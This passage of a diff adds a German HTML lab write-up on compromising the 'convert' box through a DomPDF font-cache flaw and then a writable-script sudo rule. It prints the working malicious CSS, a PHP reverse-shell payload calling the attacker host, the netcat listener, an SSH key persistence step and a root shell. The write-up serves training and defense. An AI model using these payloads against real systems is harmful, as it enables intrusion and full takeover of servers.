+                 3. Hoste `evil.css` und `evil.php` auf einem HTTP-Server.
+                 4. Starte einen Netcat-Listener für die Reverse Shell.
+                 5. Rufe die Konvertierungs-URL auf dem Ziel auf und injiziere den `<link>`-Tag für `evil.css` in einen geeigneten Parameter (z.B. `title`).
+             <br><strong>Empfehlung (Admin):</strong> Update DomPDF.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Keine Befehle, nur Links/Notizen -->
+                     <pre>
+https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
+
+Beispiel-Payload (Allgemein):
+http://[TARGET]/index.php?pdf&heading=<link rel=stylesheet href='http://[ATTACKER_IP]:[PORT]/malicious.css'>
+
+Angepasster Versuch für convert.hmv:
+http://convert.hmv/?pdf&title=<link rel=stylesheet href='http://192.168.2.199:9001/evil.css'> <!-- Maskierung & -->
+                     </pre> <!-- Maskierung < > ' hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die bösartige CSS-Datei `evil.css` wird erstellt. Sie definiert eine `@font-face` Regel für eine Schriftart namens 'evil', deren Quelle (`src`) eine URL zu einer PHP-Datei (`evil.php`) auf dem Server des Angreifers ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Erstellung der CSS-Datei gemäß dem Exploit-Mechanismus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstelle als nächstes die `evil.php`-Datei.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi evil.css</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat evil.css</span></div>
+                     <pre>
+@font-face {
+  font-family: 'evil';
+  src: url('http://192.168.2.199:9001/evil.php');
+  font-weight: 'normal';
+  font-style: 'normal';
+}
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird nach `.ttf`-Dateien gesucht, vermutlich um eine legitime Font-Datei als Basis für die `evil.php`-Payload zu finden. Anschließend wird eine solche Datei (`SourceCodePro-Regular.ttf`) nach `evil.php` kopiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein gängiger Schritt für diesen Exploit. DomPDF erwartet eine Font-Datei. Der PHP-Code wird normalerweise *in* diese Datei injiziert oder an sie angehängt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bearbeite die `evil.php` (die jetzt eine Kopie der TTF-Datei ist) und füge den PHP-Reverse-Shell-Code hinzu.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">find / -name "*.ttf" 2>/dev/null</span></div>
+                     <pre>
+/usr/share/fonts/truetype/.../SourceCodePro-Regular.ttf <!-- Beispielpfad -->
+/usr/lib/ruby/3.1.0/rdoc/generator/template/darkfish/fonts/SourceCodePro-Regular.ttf
+/usr/lib/ruby/3.1.0/rdoc/generator/template/darkfish/fonts/SourceCodePro-Bold.ttf
+/usr/lib/ruby/3.1.0/rdoc/generator/template/darkfish/fonts/Lato-Light.ttf
+/usr/lib/ruby/3.1.0/rdoc/generator/template/darkfish/fonts/Lato-Regular.ttf
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cp /usr/lib/ruby/3.1.0/rdoc/generator/template/darkfish/fonts/SourceCodePro-Regular.ttf evil.php</span></div>
+                     <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `evil.php` wird angezeigt. **Wichtiger Hinweis:** Im Log steht hier nur der PHP-Reverse-Shell-Code. Es ist anzunehmen, dass der vorherige `cp`-Befehl entweder ignoriert wurde und `evil.php` neu erstellt wurde, oder dass der PHP-Code am Anfang oder Ende der kopierten TTF-Datei eingefügt wurde (was hier nicht sichtbar ist). Für den Exploit muss die Datei für DomPDF wie eine Font-Datei aussehen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die PHP-Payload für die Reverse Shell (`bash -i ...`) ist korrekt definiert. Sie zielt auf den Angreifer-Host 192.168.2.199 auf Port 4444.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass `evil.php` von DomPDF als Font erkannt wird (ggf. Code in echte TTF einbetten). Hoste `evil.css` und `evil.php`. Starte den Netcat-Listener auf Port 4444. Trigger den Exploit.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat evil.php</span></div>
+                     <pre>
+<?php system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'"); ?> <!-- Maskierung notwendig -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Python-HTTP-Server auf Port 9001 (zum Hosten von `evil.css` und `evil.php`) und der Netcat-Listener auf Port 4444 (zum Empfangen der Shell) werden gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die notwendigen Server auf der Angreiferseite sind bereit.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Trigger nun den Exploit durch Aufruf der präparierten URL auf `convert.hmv`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 9001</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, den Exploit über einen anderen Weg zu triggern. Eine lokale `index.html`-Datei wird erstellt, die nur den Link zur `evil.css` enthält. Diese lokale HTML-Datei wird dann über den Webserver des Angreifers (Port 8000) bereitgestellt. Anschließend wird die URL `http://192.168.2.199:8000/index.html` an die Konvertierungsfunktion von `convert.hmv` übergeben (implizit durch den `wget`-Aufruf der resultierenden PDF im Log).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist die korrekte Methode, um die Schwachstelle auszunutzen. DomPDF wird angewiesen, die HTML-Datei vom Angreifer-Server zu holen. Diese HTML lädt die CSS-Datei, die wiederum die PHP-Payload (als Font) lädt. Der HTTP-Server-Log auf Port 8000 bestätigt, dass die `index.html` vom Ziel (192.168.2.119) angefragt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den HTTP-Server auf Port 9001 (für `evil.css`/`evil.php`) und den Netcat-Listener auf Port 4444.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+              <!-- Alternative Exploit-Vorbereitung -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/CVE-2022-28368]
+└─# <span class="command">vi index.html</span></div>
+                     <pre><!-- Kein Output --></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/CVE-2022-28368]
+└─# <span class="command">cat index.html</span></div>
+                     <pre><link rel=stylesheet href='http://192.168.2.199:9001/evil.css'></pre> <!-- Port 9001 für CSS/PHP -->
+                 </div>
+             </div>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~] <!-- Zurück im Home-Verzeichnis -->
+└─# <span class="command">python3 -m http.server 8000</span> <!-- Server für index.html --></div>
+                      <pre>
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.119 - - [07/May/2024 17:16:55] "GET /index.html HTTP/1.1" 200 - <!-- Anfrage vom Ziel -->
+                      </pre>
+                  </div>
+              </div>
+              <!-- Manuelle Analyse der Payloads (redundant, aber im Log) -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/CVE-2022-28368]
+└─# <span class="command">cat ../evil.php</span></div>
+                      <pre><?php system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'"); ?></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat evil.css</span></div>
+                      <pre>
+@font-face {
+  font-family: 'evil';
+  src: url('http://192.168.2.199:8000/evil.php'); <!-- Port hier 8000, sollte 9001 sein! -->
+  font-weight: 'normal';
+  font-style: 'normal';
+}
+                      </pre>
+                 </div>
+             </div>
+              <!-- MD5 Hash Berechnung -->
+             <p class="analysis"><strong>Analyse:</strong> Der MD5-Hash der URL der PHP-Payload wird berechnet. DomPDF verwendet diesen Hash im Dateinamen der gecachten Font-Datei.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Berechnung des Hashes (`59d643681ab0c655ded60a707d16c550` für Port 8000, wäre anders für Port 9001). Dies ermöglicht es, den Pfad zu erraten, unter dem die PHP-Payload auf dem Zielserver gespeichert wird, falls DomPDF sie zwischenspeichert (`/dompdf/lib/fonts/evil_normal_[HASH].php`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist eher zur Analyse nützlich. Der Exploit sollte über die CSS-Injection funktionieren, ohne den gecachten Pfad direkt aufrufen zu müssen. Stelle sicher, dass die Ports in den Payloads konsistent sind (CSS sollte auf Port 9001 zeigen).<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo -n 'http://192.168.2.199:8000/evil.php' | md5sum</span></div>
+                      <pre>59d643681ab0c655ded60a707d16c550  -</pre>
+                 </div>
+             </div>
+             <!-- Manuelle Konstruktion des Pfads -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Keine Befehle, Notizen zur Pfadkonstruktion -->
+                     <pre>
+Pfad-Schema: /dompdf/lib/fonts/[FONTNAME]_normal_[MD5_HASH].php
+Beispiel:    /dompdf/lib/fonts/evil_normal_59d643681ab0c655ded60a707d16c550.php
+==============================================================================================================================
+path = http://convert.hmv + /dompdf/lib/fonts/ + phpname + _normal_ + hash + .php
+==============================================================================================================================
+                     </pre>
+                 </div>
+             </div>
+              <!-- Versuch, gecachte Datei direkt aufzurufen -->
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die (vermutlich) von DomPDF gecachte PHP-Payload-Datei direkt über `curl` aufzurufen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Fehlgeschlagen!!** `curl` gibt eine Warnung aus, dass die Ausgabe binär ist. Dies liegt daran, dass die `evil.php` eine Kopie einer TTF-Datei ist (mit eingebettetem PHP). Der direkte Aufruf führt den PHP-Code nicht aus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verlasse dich auf den ursprünglichen Exploit-Pfad über die CSS-Injection, nicht auf den direkten Aufruf der gecachten Datei.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://convert.hmv/dompdf/lib/fonts/evil_normal_59d643681ab0c655ded60a707d16c550.php</span></div>
+                     <pre>
+Warning: Binary output can mess up your terminal. Use "--output -" to tell
+Warning: curl to output it to your terminal anyway, or consider "--output
+Warning: <FILE>" to save to a file.
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <!-- HTTP Server Log für den erfolgreichen Exploit -->
+             <p class="analysis"><strong>Analyse:</strong> Die Logs des Python-HTTP-Servers auf Port 9001 zeigen eingehende Anfragen vom Zielserver für `evil.css` und `evil.php`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass der Exploit-Mechanismus funktioniert hat: Die CSS-Datei wurde geladen, und diese hat wiederum versucht, die PHP-Payload-Datei als Font zu laden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Netcat-Listener auf Port 4444.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 9001</span></div>
+                      <pre>
+Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
+192.168.2.119 - - [07/May/2024 22:15:37] "GET /evil.php HTTP/1.1" 200 - <!-- Erster Versuch? -->
+192.168.2.119 - - [07/May/2024 22:20:32] "GET /index.html HTTP/1.1" 200 - <!-- Anfrage vom zweiten Server -->
+192.168.2.119 - - [07/May/2024 22:20:32] "GET /evil.css HTTP/1.1" 200 - <!-- CSS geholt -->
+192.168.2.119 - - [07/May/2024 22:20:32] "GET /evil.php HTTP/1.1" 200 - <!-- Payload geholt -->
+                      </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 4444 empfängt eine Verbindung vom Zielserver 192.168.2.119.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Die Reverse Shell wurde durch die DomPDF-Schwachstelle erfolgreich etabliert. Der Benutzer ist `eva`. Der Prompt zeigt das Verzeichnis, aus dem die Payload ausgeführt wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell und beginne mit der Enumeration als `eva`.<br><strong>Empfehlung (Admin):</strong> Update DomPDF dringend.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/CVE-2022-28368]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.119] 54786
+bash: cannot set terminal process group (515): Inappropriate ioctl for device
+bash: no job control in this shell
+eva@convert:/var/www/html/dompdf/lib/fonts$ <!-- Shell als 'eva' -->
+                     </pre>
+                 </div>
+             </div>
+            <!-- Annahme: Shell stabilisiert -->
+             <p class="analysis"><strong>Analyse:</strong> Es wird angenommen, dass die Shell mit Standardmethoden stabilisiert wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Verbessert die Interaktion.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `eva` wird das Home-Verzeichnis (`cd ~`, `ls -la`) untersucht und die Datei `user.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag `<span class="password">f2be48d6f922bfc0a9bf45b22887c10d</span>` wird gefunden. Außerdem existiert ein Python-Skript `pdfgen.py`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die User-Flag. Untersuche die Berechtigungen (`sudo -l`) und das Skript `pdfgen.py`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+eva@convert:/var/www/html/dompdf/lib/fonts$ <span class="command">cd ~</span>
+eva@convert:~$ <span class="command">ls -la</span>
+total 32
+drwx------ 2 eva  eva  4096 Feb 24 10:09 .
+drwxr-xr-x 3 root root 4096 Feb 22 22:17 ..
+lrwxrwxrwx 1 root root    9 Feb 23 17:01 .bash_history -> /dev/null
+-rw-r--r-- 1 eva  eva   220 Feb 22 22:17 .bash_logout
+-rw-r--r-- 1 eva  eva  3526 Feb 22 22:17 .bashrc
+-rw-r--r-- 1 eva  eva   807 Feb 22 22:17 .profile
+-rw-r--r-- 1 root root    1 Feb 24 10:10 pdf_gen.log
+-rw-r--r-- 1 root root 2736 Feb 23 21:36 pdfgen.py
+-rw-r----- 1 eva  eva    33 Feb 23 17:16 user.txt
+eva@convert:~$ <span class="command">cat user.txt</span>
+<span class="password">f2be48d6f922bfc0a9bf45b22887c10d</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird nach weltweit beschreibbaren Dateien gesucht (`find / -writable -type f`). Anschließend wird die Suche auf Dateien gefiltert, die `root` gehören (`grep root`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Suche nach beschreibbaren Dateien liefert viele Treffer, hauptsächlich im `/proc`- und `/sys`-Dateisystem, die für eine direkte Privilegieneskalation normalerweise nicht nützlich sind. Es werden keine kritischen, von Root beschreibbaren Konfigurationsdateien oder Binaries gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Methode führt hier nicht zum Ziel. Suche nach SUID-Binaries oder prüfe `sudo`-Rechte.<br><strong>Empfehlung (Admin):</strong> Überprüfe regelmäßig Dateiberechtigungen, um unsichere Konfigurationen zu vermeiden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+eva@convert:~$ <span class="command">find / -writable -type f 2>/dev/null</span>
+/var/www/html/index.php
+/var/www/html/style.css
+/home/eva/user.txt
+/home/eva/.profile
+/home/eva/.bash_logout
+/home/eva/.bashrc
+/proc/sys/...
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.access
+/sys/kernel/security/tomoyo/self_domain
+... (viele /proc, /sys Einträge)
+                     </pre> <!-- Gekürzt -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+eva@convert:~$ <span class="command">find / -writable -type f -ls 2>/dev/null | grep root</span>
+   484696      0 -rw-rw-rw-   1 root     root            0 May  8 02:07 /proc/sys/kernel/ns_last_pid
+4026532059      0 -rw-rw-rw-   1 root     root            0 May  8 02:07 /proc/pressure/io
+4026532061      0 -rw-rw-rw-   1 root     root            0 May  8 02:07 /proc/pressure/cpu
+4026532060      0 -rw-rw-rw-   1 root     root            0 May  8 02:07 /proc/pressure/memory
+... (viele /proc Einträge) ...
+                     </pre> <!-- Gekürzt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird nach SUID-Binaries gesucht (`find / -perm -u=s -type f`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Sudo gefunden!!** Die Suche findet Standard-SUID-Binaries und `/usr/bin/sudo`. Das Vorhandensein von `sudo` ist ein potenzieller Vektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `sudo -l` aus, um die Berechtigungen für den Benutzer `eva` zu überprüfen.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass `sudo` sicher konfiguriert ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+eva@convert:~$ <span class="command">find / -perm -u=s -type f 2>/dev/null</span>
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/mount
+/usr/bin/sudo <!-- !!! -->
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `eva` fügt den öffentlichen SSH-Schlüssel des Angreifers zu ihrer `~/.ssh/authorized_keys`-Datei hinzu.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ermöglicht dem Angreifer einen bequemeren, passwortlosen SSH-Zugang als `eva`. Dies ist für die weitere Eskalation nützlich, aber nicht der Eskalationsvektor selbst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze den Schlüssel für zukünftige Logins. Führe `sudo -l` aus.<br><strong>Empfehlung (Admin):</strong> Überwache Änderungen an `authorized_keys`-Dateien.</p>
+             <!-- SSH Key hinzufügen -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+eva@convert:~$ <span class="command">mkdir .ssh</span>
+eva@convert:~$ <span class="command">cd .ssh</span>
+eva@convert:~/.ssh$ <span class="command">echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCd3lwjw0FoS9Aq+6hAoD9phQSnr5Ur3d+6Glz1I5FcdsCCHv3ayA3q2Fm3TxUT8SwWHBxDNQahH1hysdcIlFt5qnC5TGtFa32X+sNrqMizv/rqMVlZ5QLYFdaMHp4NrUZjhIrv5MVTp4yvoodJhE/wAzkBMgTe8NIksjP021tFzQoyQ+Nnh8dLKUP0LMTSm03mnFwh5ryzT59WT7SXfnN2+rVEFKGSxaRQbe+dnfx3ELI4T0NTgJQY6P0PEXkMLxSpKtDlgaJv0Kplk4qwtPDV/td+5XAI+1Hn9/CMQ1updHowU98uirtqRHt2sks2ZA+a2xRzFIbtHF6IlFl3ulxUicSgXqMhGm+hACCrR2GBGyF5Dtmje8cElT+LN3077vGra9RQY77NAz2jKKAfM4pTzG7IrgmCoZbpMgdes9j+2UKF+x3sB87IauzpgRoGry0IgduEeiCTQwE107J1zWE4B39jnQwJEEnThyCSUqRSKSLfCIAt8F9Sbs= root@cyber' > authorized_keys</span>
+eva@convert:~/.ssh$ <span class="command">ls</span>
+authorized_keys
+                     </pre>
+                 </div>
+             </div>
+              <!-- SSH Login mit Key -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh eva@convert.hmv</span></div> <!-- Kein -i mehr nötig, wenn Standard-Key verwendet wird -->
+                     <pre>
+Linux convert 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
+...
+eva@convert:~$
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als `eva` wird `sudo -l` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** `eva` darf `/usr/bin/python3 /home/eva/pdfgen.py *` als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD:`) ausführen. Da `eva` Schreibrechte auf ihr eigenes Home-Verzeichnis und somit auf `pdfgen.py` hat, kann sie dieses Skript manipulieren und dann über `sudo` mit Root-Rechten ausführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1.  Überprüfe den Inhalt von `/home/eva/pdfgen.py`.
+                 2.  Ersetze den Inhalt von `pdfgen.py` durch ein Skript, das eine Root-Shell startet (z.B. `import os; os.system("/bin/bash")`).
+                 3.  Führe den `sudo`-Befehl aus: `sudo /usr/bin/python3 /home/eva/pdfgen.py beliebiger_parameter` (der Stern `*` erlaubt beliebige Argumente).
+             <br><strong>Empfehlung (Admin):**DRINGEND:** Ändere die `sudo`-Regel. Erlaube niemals `sudo`-Ausführung von Skripten, auf die der ausführende Benutzer Schreibrechte hat. Wenn ein Skript mit `sudo` ausgeführt werden muss, stelle sicher, dass es Root gehört und nur Root Schreibrechte darauf hat.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+eva@convert:~$ <span class="command">sudo -l</span>
+Matching Defaults entries for eva on convert:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User eva may run the following commands on convert:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die ursprüngliche `pdfgen.py`-Datei wird gelöscht (`rm`). Anschließend wird eine neue `pdfgen.py`-Datei mit `vi` erstellt und ihr Inhalt mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die neue `pdfgen.py` enthält nur den Befehl `os.system("/bin/bash")`, der eine Bash-Shell startet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe nun den `sudo`-Befehl aus, um die manipulierte Datei als Root zu starten.<br><strong>Empfehlung (Admin):</strong> Die Korrektur der `sudo`-Regel ist entscheidend.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+eva@convert:~$ <span class="command">rm pdfgen.py</span>
+eva@convert:~$ <span class="command">vi pdfgen.py</span>
+eva@convert:~$ <span class="command">cat pdfgen.py</span>
+import os
+
+os.system("/bin/bash")
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der `sudo`-Befehl wird ausgeführt, um das manipulierte Python-Skript `pdfgen.py` als Root zu starten. Ein Stern `*` wird als Argument übergeben, wie von der `sudo`-Regel erlaubt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Das Skript wird als Root ausgeführt, und der Befehl `os.system("/bin/bash")` startet eine interaktive Bash-Shell mit Root-Rechten. Der Prompt wechselt zu `root@convert:/home/eva#`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Wechsle ins Root-Verzeichnis und lies die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die unsichere `sudo`-Regel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+eva@convert:~$ <span class="command">sudo -u root /usr/bin/python3 /home/eva/pdfgen.py *</span> <!-- -u root ist optional, da ALL:ALL -->
+root@convert:/home/eva# <!-- Root-Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird ins Root-Home-Verzeichnis gewechselt und die Datei `root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">1cc872dad04d177e6732abbedf1e525b</span>` wird erfolgreich ausgelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+root@convert:/home/eva# <span class="command">cd ~</span>
+root@convert:~# <span class="command">ls</span>
+root.txt
+root@convert:~# <span class="command">cat root.txt</span>
+<span class="password">1cc872dad04d177e6732abbedf1e525b</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">1cc872dad04d177e6732abbedf1e525b</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/eva/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">f2be48d6f922bfc0a9bf45b22887c10d</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus dirb/wget Scan extrahiert -->
+        <p>Berichtsdatum: 7. Mai 2024</p>
+    </footer>
+</body>
+</html> 
